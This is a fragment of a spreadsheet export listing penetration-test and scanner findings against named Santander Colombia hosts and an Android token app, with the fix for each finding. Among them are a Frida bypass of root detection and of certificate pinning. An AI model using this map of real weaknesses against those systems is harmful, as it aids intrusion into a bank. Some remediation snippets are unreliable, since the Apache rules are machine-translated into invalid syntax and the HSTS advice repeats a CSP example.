    <t>La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar
scripts dentro de la página.</t>
  </si>
  <si>
    <t>Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a
securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página
externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos.
Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera
HTTP Content-Security-Policy.
Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos
sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran
parte de las capacidades de seguridad de la cabecera.
Un ejemplo de configuración de cabecera es el siguiente:
· Content-Security-Policy: default-src 'self' *.trusted.com
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:
· &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src
'none';"&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO035</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO036</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO037</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO038</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO039</t>
  </si>
  <si>
    <t>Ausencia de cabecera Permissions-Policy</t>
  </si>
  <si>
    <t>https://www.cdt.santander.com.co/</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador.</t>
  </si>
  <si>
    <t>Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a
funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de
la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte
de contenido embebido o de terceros.</t>
  </si>
  <si>
    <t>Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO040</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO041</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO042</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO043</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO044</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO045</t>
  </si>
  <si>
    <t>Ausencia de cabecera Strict-Transport-Security (HTST)</t>
  </si>
  <si>
    <t>2.8</t>
  </si>
  <si>
    <t>La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales
servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante
pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante
la sesión.
El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, empleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la información se envía a través de un canal seguro.
El protocolo incorpora una cabecera HTTP "HSTS" (HTTP Strict Transport Security) enviada desde el
servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación
entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una
cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y
subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán
almacenadas en el navegador durante un tiempo determinado que se establece en la propia
cabecera de respuesta</t>
  </si>
  <si>
    <t>Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta "HSTS"
en todas las respuestas del servidor. La sintaxis para ello es:
• Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains]
El parámetro "max-age" especifica el tiempo requerido para usar HTTPS y debería ser un número
alto, del orden de varios meses. La flag "includeSubDomains" define que la política aplica también a
los subdominios. Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una
política, por ejemplo:
· &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src
'none';"&gt;</t>
  </si>
  <si>
    <t>En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web
y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO046</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO047</t>
  </si>
  <si>
    <t>MAN-686670906c975521ca42a139</t>
  </si>
  <si>
    <t>SC-25-CNAPP-009-AP-001</t>
  </si>
  <si>
    <t>Evasión del control de detección de dispositivo Rooteado</t>
  </si>
  <si>
    <t>5.5</t>
  </si>
  <si>
    <t>App Santander Token Colombia Android</t>
  </si>
  <si>
    <t>Hay que tener en cuenta que las detecciones de root son siempre susceptibles a ser evadidas, ya que se tiene control ilimitado sobre el dispositivo y todas las aplicaciones que se ejecutan. Haciendo uso de la herramienta "Frida" para poder realizar técnicas de instrumentación dinámica del código ha sido posible evadir el control de "Root" implementado ejecutando la aplicación en un dispositivo Rooteado.</t>
  </si>
  <si>
    <t xml:space="preserve">Cuando un dispositivo es rooteado, el sistema es modificado y se instalan algunos archivos nuevos
en el dispositivo. La comprobación de de la integridad del sistema y estos archivos/paquetes
instalados en el dispositivo son algunas formas de comprobar si un dispositivo está rooteado o no.
A continuación, se enumeran algunas técnicas más utilizadas para la detección de dispositivos
rooteados:
- Detección de root con SafetyNet Attestation API: Google ofrece la API SafetyNet, que detecta si el
dispositivo ha sido modificado (rooteado, bootloader desbloqueado, etc.). A continuación, se
muestra un ejemplo de implementación en kotlin/Java: 
afetyNet.getClient(this).attest(nonce, API_KEY)
 .addOnSuccessListener { response -&gt;
 val jwsResult = response.jwsResult
 // Analizar el resultado y verificar si el dispositivo es seguro
 }
 .addOnFailureListener {
 // Bloquear la app si falla la verificación
 }
- Detección manual de root (Archivos del sistema y comandos)
 - Busqueda de archivos sospechosos como Superuser.apk, eu.chainfire.supersu o el comando su.
A continuación, se muestra un ejemplo de implementación en kotlin/Java:
 fun isRooted(): Boolean {
 val paths = arrayOf(
 "/system/bin/su", "/system/xbin/su", "/system/app/Superuser.apk"
 )
 return paths.any { File(it).exists() }
 }
 - Hay aplicaciones como Busybox que solo funcionan en dispositivos rooteados. Verificar si está
instalada es otra manera de comprobar si el dispositivo está rooteado o no.
 - Ejecución de comandos "su" e "id" y verificar si el UID es root.
 - Verificar el atributo "BUILD" para comprobar si el dispositivo está corriendo una ROM
customizada. Google usa la etiqueta 'release-keys' cuando se trata de ROMs de stock. Si al verificar
esta etiqueta encontramos algo similar a 'test-keys', estamos ante una ROM customizada. </t>
  </si>
  <si>
    <t>Los dispositivos rooteados, son dispositivos que han sido modificados para permitir que todas las aplicaciones se ejecuten con permisos de superusuario eliminando el sistema de seguridad sandbox que el SO impone. Esto da lugar a que el dispositivo esté expuesto a diferentes amenazas, como podrían ser cualquier tipo de malware o robo de contraseñas a través de keyloggers entre otros.</t>
  </si>
  <si>
    <t>MAN-686670c86c975521ca42a13a</t>
  </si>
  <si>
    <t>SC-25-CNAPP-009-AP-002</t>
  </si>
  <si>
    <t xml:space="preserve">Evasión del control de Certificate Pinning </t>
  </si>
  <si>
    <t>La técnica de Certificate Pinning permite a la aplicación validar la identidad del servidor en las conexiones HTTPS garantizando que la aplicación puede detectar si un atacante está situado en medio de la comunicación y presentando su propio certificado. Para realiza esta validación se suele comprobar la firma del certificado y/o la clave pública, adicionalmente a las comprobaciones de caducidad y validez de la cadena de certificados. En la presente revisión, se ha comprobado que la aplicación implementa un sistema de Certificate Pinning pero que ha sido posible evadir esta protección.</t>
  </si>
  <si>
    <t>Para implementar de manera correcta la técnica de SSL Pinning y prevenir los ataques de tipo Manin-the-Middle (MitM) existen dos tipo de implementaciones diferentes:
•Pinning de Certificado: se almacena el certificado completo dentro de la aplicación y la app solo
acepta conexiones si el certificado recibido coincide exactamente con el almacenado. A continuación,
se muestra un ejemplo de implementación en Kotlin.
val client = OkHttpClient.Builder() 
.certificatePinner(
 CertificatePinner.Builder()
 .add("mi-servidor.com", "sha256/tuCertificadoHash")
 .build()
 )
 .build()
•Pinning de Clave Pública: en lugar de almacenar el certificado completo, solo se almacena la clave
pública del servidor, en este caso, si el servidor cambia su certificado pero mantiene la misma clave
pública, la app sigue funcionando.
Esta medida de protección puede ser evadida mediante el uso de Frida y su instrumentación
dinamica, la cual permite interceptar y modificar funciones en tiempo de ejecución.
Adicionalmente, también pueden utilizarse modulos de Magisk para realizar la evasión de este tipo
de protección.
Teniendo en cuenta estas dos afirmaciones, el SSL Pinning por si solo no es suficiente, deben
aplicarse protecciones complementarias como la detección de Frida y la detección de modificaciones
en tiempo de ejecución. 
Para finalizar, se deben implementar mecanismos que dificulten las tareas de debugging, como por
ejemplo, mediante técnicas de ofuscación con herramientas como ProGuard o R8 para ofuscar
nombres de clases y métodos, la división de las funciones de detección de root en varias partes del
código en lugar de centralizarla en un solo métodos y usar técnicas de detección dinámica en
diferentes momentos de ejecución.</t>
  </si>
  <si>
    <t>Un atacante puede evadir la protección de Certificate Pinning con la intención de investigar y
manipular la información transmitida, entre el dispositivo móvil y el servidor legítimo de aplicaciones,
con el objetivo de detectar posibles vulnerabilidades en de la plataforma.</t>
  </si>
  <si>
    <t>MAN-686670fd6c975521ca42a13b</t>
  </si>
  <si>
    <t>SC-25-CNAPP-009-AP-003</t>
  </si>
  <si>
    <t>Información sensible en archivos de log</t>
  </si>
  <si>
    <t>Incluir información sensible en los archivos de log puede provocar una exposición de estos a atacantes o aplicaciones maliciosas, vulnerando la confidencialidad del usuario.</t>
  </si>
  <si>
    <t>Se recomienda borrar todas las declaraciones de loging del código fuente de las versiones de
producción de la aplicación, entre estas declaraciones se incluyen las siguientes funciones y clases:
- android.util.Log
- Log.d | Log.e | Log.i | Log.v | Log.w | Log.wtf
- Logger</t>
  </si>
  <si>
    <t xml:space="preserve">Un atacante con acceso a los ficheros de log del dispositivo tendría acceso a información confidencial, tal como las respuestas del servidor descifradas o el contenido de las peticiones que realiza la aplicación al servidor. </t>
  </si>
  <si>
    <t>SC-25-CNAPP-009-AP-004</t>
  </si>
  <si>
    <t>Credenciales en código fuente</t>
  </si>
  <si>
    <t>2.6</t>
  </si>
  <si>
    <t>Se han localizado credenciales almacenadas en el propio código fuente de la aplicación.</t>
  </si>
  <si>
    <t>Se recomienda no utilizar credenciales en texto claro directamente en el propio código fuente de la aplicación móvil ya que podrían estar accesibles a cualquier atacante que realice un proceso de decompilación aplicación. En su lugar se recomienda utilizar un sistema de autenticación basado en tokens y almacenarlos en el almacenamiento de credenciales específico del Sistema Operativo.</t>
  </si>
  <si>
    <t>Un usuario puede autenticarse en la plataforma con las credenciales expuestas en el código fuente de la aplicación móvil. El nivel de acceso obtenido corresponderá con los permisos y privilegios específico del usuario al que corresponden las credenciales obtenidas. Debido a que no se ha encontrado el lugar donde utilizarla, el riesgo es bajo.</t>
  </si>
  <si>
    <t>MAN-686bac4370644f0580904c18</t>
  </si>
  <si>
    <t>SC-25-CNMPO-010-CO-001</t>
  </si>
  <si>
    <t>Fuga de información de servidor  y versión</t>
  </si>
  <si>
    <t>4.4</t>
  </si>
  <si>
    <t>https://www.santander.com.co/Empresas/#
/administrationGeneral/login</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma</t>
  </si>
  <si>
    <t>SC-25-CNMPO-010-CO-002</t>
  </si>
  <si>
    <t>Cabecera Content-Security-Policy con configuraciones inseguras</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado que el servidor web incluye la cabecera Content Security Policy (CSP) con los valores unsafe-inline y unsafe-eval. Esto representa un riesgo de seguridad, ya que permite la ejecución de código JavaScript embebido directamente en la página y el uso de funciones peligrosas como eval(). Estas configuraciones  aumentan la vulnerabilidad a ataques de tipo Cross Site Scripting (XSS), facilitando la ejecución de código malicioso en el navegador del usuario. </t>
  </si>
  <si>
    <t xml:space="preserve">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"Content-SecurityPolicy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se
trata de una versión antigua y no es necesario configurarla).
Un ejemplo de configuración de cabecera es el siguiente:
• Content-Security-Policy: default-src 'self' *.trusted.com
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:
• &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src
'none';"&gt;
</t>
  </si>
  <si>
    <t>La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t>SC-25-CNMPO-010-CO-003</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de tipo "gzip" o "DEFLATE"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t>
  </si>
  <si>
    <t>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cómo se deshabilita la compresión HTTP para Apache y NGINX:
Deshabilitar compresión en Apache:
• Deshabilite el módulo mod_deflate utilizando el siguiente comando:
 $ sudo a2dismod deflate
• Reinicie el servidor:
 $ sudo /etc/init.d/apache2 restart
Deshabilitar compresión en NGINX:
• Establezca la configuración del host con la opción gzip en off:
 server {
 server_name www.example.com;
 listen 443 ssl http2;
 gzip off;
 }</t>
  </si>
  <si>
    <t>SSO-Prospera</t>
  </si>
  <si>
    <t>QA-WAS-23814fc7-2d72-4cda-bbf1-252d47f5de72</t>
  </si>
  <si>
    <t>https://sso-management.servicios.santanderconsumer.co/santander</t>
  </si>
  <si>
    <t>The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute.</t>
  </si>
  <si>
    <t>If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies.</t>
  </si>
  <si>
    <t>QA-WAS-28c255d7-9c6e-4e69-beab-a22a3238924c</t>
  </si>
  <si>
    <t>QA-WAS-8d99c9db-2742-4dce-93f8-4b9014828454</t>
  </si>
  <si>
    <t>QA-WAS-a10fc963-c69f-4640-82af-ad20d3cdd60e</t>
  </si>
  <si>
    <t>QA-WAS-f1b8b665-1c14-4b2e-af00-6327757c2f7d</t>
  </si>
  <si>
    <t>QA-WAS-036815ab-5173-4e17-8ad8-70fb396cb52e</t>
  </si>
  <si>
    <t>The cookie does not contain the &amp;quot;secure&amp;quot; attribute.</t>
  </si>
  <si>
    <t>If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-448ad1ff-ef9f-435f-a0bb-4ebf5fd1dd2b</t>
  </si>
  <si>
    <t>QA-WAS-63275107-59f7-408f-bd5b-532f65cabd84</t>
  </si>
  <si>
    <t>QA-WAS-eb395f98-990c-4cce-92f7-d5bd1e571b31</t>
  </si>
  <si>
    <t>QA-WAS-f017d97c-5061-487b-b9ef-9ed3bfa394df</t>
  </si>
  <si>
    <t>SC-25-CNMPO-006-CO-001</t>
  </si>
  <si>
    <t>sso-management.servicios.santanderconsumer.Co</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de tipo "gzip" o "DEFLATE"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t>
  </si>
  <si>
    <t>Se recomienda desactivar la compresión HTTP por completo, reduciendo el rendimiento, o adoptar
soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como
el uso de protección de falsificación de petición en sitios cruzados (CSRF).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cómo se desactivaría la compresión HTTP para Apache y NGINX:
Deshabilitar compresión en Apache:
• Deshabilite el módulo mod_deflate utilizando el siguiente comando:
 $ sudo a2dismod deflate
• Reinicie el servidor:
 $ sudo /etc/init.d/apache2 restart
Deshabilitar compresión en NGINX:
• Establezca la configuración del host con la opción gzip en off:
 server {
 server_name www.example.com;
 listen 443 ssl http2;
 gzip off;
 }</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>SC-25-CNMPO-006-CO-002</t>
  </si>
  <si>
    <t>prospera.santanderconsumer.com</t>
  </si>
  <si>
    <t>SC-25-CNMPO-006-CO-003</t>
  </si>
  <si>
    <t>Falta de cabecera HTTP Strict Transport Security (HSTS)</t>
  </si>
  <si>
    <t>La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante la sesión.
La estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, empleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la información se envía a través de un canal seguro.
El protocolo incorpora una cabecera HTTP "HSTS" (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacenadas en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta</t>
  </si>
  <si>
    <t>Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta "HSTS"
en todas las respuestas del servidor. La sintaxis para ello es:
•Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains]
El parámetro "max-age" especifica el tiempo requerido para usar HTTPS y debería ser un número
alto, del orden de varios meses. La flag "includeSubDomains" define que la política aplica también a
los subdominios.</t>
  </si>
  <si>
    <t>En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor
web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web
y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y
servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas</t>
  </si>
  <si>
    <t>QA-WAS-db09f9cc-fe72-48df-a171-c8367d1e3f17</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/sources/</t>
  </si>
  <si>
    <t>A potentially sensitive file, directory, or directory listing was discovered on the Web server.</t>
  </si>
  <si>
    <t>Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it.</t>
  </si>
  <si>
    <t>MAN-686fa9bb70644f058090aeb4</t>
  </si>
  <si>
    <t xml:space="preserve"> https://181.57.221.233/</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a
un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como
generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>Métodos HTTP inseguros habilitados en el servidor</t>
  </si>
  <si>
    <t>El servidor acepta más métodos HTTP de los únicos necesarios para el correcto funcionamiento del aplicativo. Estos métodos podrían permitir a un atacante realizar ciertas acciones en el sistema, desde la obtención de información o incluso creación o borrado de elementos.</t>
  </si>
  <si>
    <t>Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea
posible. Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones
de tipo API RESTFUL en las que se necesite su uso . Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos
HTTP/HTTPS para comunicarse.</t>
  </si>
  <si>
    <t>Dependiendo la configuración en el servidor, el uso de ciertos métodos como (PUT, DELETE, TRACE
u OPTIONS) podrían permitir a un atacante realizar ciertas opciones como por ejemplo, crear o
borrar elementos.</t>
  </si>
  <si>
    <t>Ausencia de protección contra Clickjacking</t>
  </si>
  <si>
    <t>La aplicación no establece medidas de seguridad que controlen el uso de sus páginas web dentro de otros “Frames” HTML ubicados en aplicaciones de otros dominios. De esta manera, se puede definir una página HTML con un frame transparente y, en otro frame, cargar una página legítima de la aplicación afectada. Así, el usuario interactúa sin saberlo con el frame transparente, que ejecutará cualquier código ideado por el atacante aunque la apariencia de la aplicación que contempla el usuario sea la de la aplicación legítima que se encuentra cargada debajo del frame transparente</t>
  </si>
  <si>
    <t>Se recomienda utilizar la cabecera "X-Frame-Options" en las respuestas HTTP para notificar al
navegador los permisos sobre qué dominios pueden cargar las páginas de la aplicación.
Actualmente esta funcionalidad se encuentra ampliamente soportada. Seleccionar una de las
siguiente opciones según corresponda.
• Indica al navegador que la página no se debe cargar nunca dentro de otro frame
 X-Frame-Options: DENY 
• Indica al navegador que la página se podrá cargar únicamente en frames pertenecientes al
mismo dominio
 X-Frame-Options: SAMEORIGIN
• Indica al navegador que la página se permite cargar en frames únicamente pertenecientes
al dominio indicado
 X-Frame-Options: ALLOW-FROM &lt;origen&gt;
Adicionalmente, se pueden incluir fragmentos de Javascript en la respuesta que detecten si se
encuentra dentro de un frame y cargar la página sin frames.
El ejemplo más sencillo sería incluir al principio del código HTML de la respuesta lo siguiente:
 &lt;script&gt;if (top!=self) top.location.href=self.location.href&lt;/script&gt;</t>
  </si>
  <si>
    <t>De no configurar correctamente el servidor y/o la aplicación web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de Phishing para provocar que el usuario legítimo acceda a la página maliciosa. El riesgo de este tipo de vulnerabilidad se establece como bajo por la dificultad de realizar un ataque con éxito. Para ello, sería necesario dirigir la navegación de un usuario a un sitio controlado por un atacante, posiblemente con una URL similar a la de la aplicación legítima. En ese sitio, una página HTML contendría un frame que carga la página legítima de la aplicación afectada. En dicho caso, por ejemplo, entrarían en juego aspectos tales como el certificado del servidor del atacante y la URL, que provocaría una alerta del navegador al usuario y tendría que aceptar o pasar por alto que no son propios de la aplicación.</t>
  </si>
  <si>
    <t>La ausencia de las cabeceras cache-control y pragma HTTP permite que el navegador y los proxies almacenen el contenido en la memoria caché. Independientemente de la política de caché definida por la aplicación web.</t>
  </si>
  <si>
    <t>Las aplicaciones deben devolver las directivas de almacenamiento en caché indicando a los
navegadores que no almacenen copias locales de ningún dato sensible. A menudo, esto se puede lograr mediante la configuración del servidor web para evitar el almacenamiento en caché de rutas relevantes o cualquier otra información sensible. Alternativamente, la mayoría de las plataformas de desarrollo web, permiten controlar las directivas de almacenamiento en caché del servidor desde scripts individuales. 
Se recomienda que el servidor web devuelva las siguientes cabeceras HTTP en todas las respuestas
que contengan contenido sensible:
• Cache-control: no-store
• Pragma: no-cache</t>
  </si>
  <si>
    <t>A menos que se indique lo contrario, los navegadores pueden almacenar una copia en caché local del contenido recibido de los servidores web. Algunos navegadores, guardan en caché el contenido obtenido a través de HTTPS. Si la información sensible en las respuestas de la aplicación se almacena en caché local, puede ser recuperada por otros usuarios que tienen acceso a la misma computadora en un momento futuro además de ser susceptible a ataques de tipo Caché Poisoning</t>
  </si>
  <si>
    <t>QA-WAS-2321d6bb-e0cd-4456-a49f-7aa7636b8964</t>
  </si>
  <si>
    <t>https://psepagos.santander.com.co/</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies.</t>
  </si>
  <si>
    <t>QA-WAS-4f0a7091-1b81-406f-9009-74aad6d1261c</t>
  </si>
  <si>
    <t>QA-WAS-8335bd4e-7c6f-470d-a2bb-d4d17cb671ea</t>
  </si>
  <si>
    <t>QA-WAS-963e0f67-5b90-4d7e-980f-ac6438fbf6b3</t>
  </si>
  <si>
    <t>QA-WAS-a1f5fada-85bc-4c40-903c-9a761c1b8758</t>
  </si>
  <si>
    <t>QA-WAS-bdcc34ad-8343-4ef3-96e4-99980eb3ec73</t>
  </si>
  <si>
    <t>QA-WAS-e188397f-6703-4181-b7c7-e0de6f9f5611</t>
  </si>
  <si>
    <t>QA-WAS-09684b94-37e5-43da-a186-9d8a9e072355</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;seguro&amp;quot; a las cookies y obligue a que todas las solicitudes confidenciales se envíen a través de HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-1398d935-e923-4c5d-9cb2-c08bfa972734</t>
  </si>
  <si>
    <t>QA-WAS-66d469c6-b13b-4246-9895-2eacd6356044</t>
  </si>
  <si>
    <t>QA-WAS-a720e367-ea4c-4e7d-9924-b6e4a82a0ae6</t>
  </si>
  <si>
    <t>QA-WAS-bb7f57a9-d0df-4a33-9cd8-cbc5b70fd987</t>
  </si>
  <si>
    <t>QA-WAS-d5ea8a6a-d9df-44f6-9552-94f71172d67d</t>
  </si>
  <si>
    <t>QA-WAS-dcbfb343-e73c-480a-9c02-09641960c057</t>
  </si>
  <si>
    <t>QA-WAS-f590c091-8752-4144-9d03-35f6a789e2d7</t>
  </si>
  <si>
    <t>La página web se puede enmarcar. Esto significa que los ataques de clickjacking contra los usuarios son posibles.</t>
  </si>
  <si>
    <t>Common clickjacking prevention mechanisms include:
X-Frame-Options: This is an HTTP response header that is used to prevent framing of the web page.
Framekiller JavaScript code: Special JS code can be used to prevent a malicious user from framing the page. This method is less reliable than using X-Frame-Options.</t>
  </si>
  <si>
    <t>QA-WAS-a00b7f54-d1bc-4017-a701-ee709736b748</t>
  </si>
  <si>
    <t>https://psepagos.santander.com.co/icons/small/</t>
  </si>
  <si>
    <t>El servidor web presenta una lista de directorios</t>
  </si>
  <si>
    <t>The presence of a browseable directory does not necessarily imply a vulnerability. Determine if the directory listing is intended to be displayed. Verify that no files in the directory contain content that should not be served by the Web application.</t>
  </si>
  <si>
    <t>QA-VM--6577122839519728492</t>
  </si>
  <si>
    <t>psepagos.santander.com.co</t>
  </si>
  <si>
    <t>Se ha detectado un servidor web que admite el método HTTP TRACE. Este método permite la depuración y el análisis de seguimiento de conexiones para las conexiones del cliente al servidor web. Según la especificación HTTP, cuando se utiliza este método, el servidor web devuelve la información que le envía el cliente sin modificar ni filtrar. El servidor web de Microsoft IIS usa un alias TRACK para este método y es funcionalmente el mismo. Se descubrió una vulnerabilidad relacionada con este método. Un componente activo y malintencionado de una página web puede enviar solicitudes de seguimiento a un servidor web que admita este método de seguimiento. Por lo general, la seguridad del navegador no permite el acceso a sitios web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo realice solicitudes externas a servidores web arbitrarios más allá del servidor web de alojamiento. Dado que el servidor web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en web (si ha iniciado sesión) que el explorador envía automáticamente a la aplicación web especificada en el servidor web especificado. La importancia de la capacidad de seguimiento en esta vulnerabilidad es que el componente activo de la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, pero la obtiene después de que el servidor web de destino la devuelva como su respuesta de seguimiento. Dado que esta vulnerabilidad existe como soporte para un método requerido por la especificación del protocolo HTTP, los servidores web más comunes son vulnerables. Los métodos exactos admitidos, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados a continuación. Se requiere que el seguimiento / rastreo esté deshabilitado para cumplir con PCI.</t>
  </si>
  <si>
    <t>A continuación se proporcionan soluciones para algunos de los servidores web más comunes. Para otros servidores web, consulte la documentación de su proveedor. Apache: Las versiones recientes de Apache tienen un módulo Rewrite que permite que las solicitudes HTTP se reescriban o manejen de una manera específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que deba quitar la marca de comentario de las directivas 'AddModule' y 'LoadModule' en el archivo de configuración httpd.conf. Agregue las siguientes líneas para cada virtualhost en su archivo de configuración (tenga en cuenta que, de forma predeterminada, las configuraciones de reescritura no se heredan. Esto significa que debe tener directivas de reescritura para cada host virtual en el que desee usarlo): &lt;IfModule mod_rewrite.c&gt; RewriteEngine activado RewriteCond %{REQUEST_METHOD} ^TRACE RewriteRule .* - [F] &lt;/IfModule&gt; Con esta configuración, Apache detecta todas las solicitudes TRACE y responde con una página que informa de la solicitud como prohibida. No se devuelve nada del contenido de la solicitud original. Una solución un poco más ajustada es usar: &lt;IfModule mod_rewrite.c&gt; RewriteEngine activado RewriteCond %{REQUEST_METHOD} !^(GET|CORREO|CABEZA)$ RewriteRule .* - [F] &lt;/IfModule&gt; Tenga en cuenta que RewriteEngine puede hacer un uso intensivo del procesador y puede afectar al rendimiento del servidor web. El método de seguimiento también se puede controlar mediante el uso de la directiva TraceEnable. En el archivo httpd.conf agregue o modifique: TraceEnable Desactivado Microsoft IIS: Microsoft lanzó URLScan, que se puede usar para filtrar todas las solicitudes entrantes en función de conjuntos de reglas personalizados. URLScan se puede utilizar para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS asigna el alias 'TRACK' a 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe agregarse al filtro. URLScan utiliza el archivo de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En eso, tenemos dos secciones: AllowVerbs y DenyVerbs. El primero se usa si la variable UseAllowVerbs se establece en 1, de lo contrario (si se establece en 0), se usan DenyVerbs. 